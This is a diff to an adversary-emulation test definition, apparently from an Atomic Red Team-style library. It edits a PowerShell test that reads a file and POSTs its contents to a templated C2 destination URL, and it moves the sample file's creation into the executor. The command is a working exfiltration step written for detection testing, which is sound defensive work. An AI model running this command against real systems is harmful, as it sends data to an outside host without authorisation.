@@ -15,19 +15,13 @@ atomic_tests:
     filepath:
       description: The file which is being exfiltrated to the C2 Server.
       type: Path
-      default: C:\Users\$env:UserName\LineNumbers.txt
-  dependency_executor_name: powershell
-  dependencies:
-  - description: |
-      The file to be exfiltrated must be present on the machine. Running the pre-reqs will create a sample file to be exfiltrated, else give the path of already present file as input.
-    prereq_command: |
-      if ([System.IO.File]::Exists("#{filepath}")){exit 0} else {exit 1}
-    get_prereq_command: |
-      echo "Creating file to be exfiltrated" 
-      1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value "This is line $_." }
+      default: $env:TEMP\LineNumbers.txt
   executor:
     command: |
-      [System.Net.ServicePointManager]::Expect100Continue = $false
-      $filecontent = Get-Content -Path #{filepath}
-      Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
+     if(-not (Test-Path #{filepath})){ 
+       1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value "This is line $_." }
+     }
+     [System.Net.ServicePointManager]::Expect100Continue = $false
+     $filecontent = Get-Content -Path #{filepath}
+     Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
     name: powershell
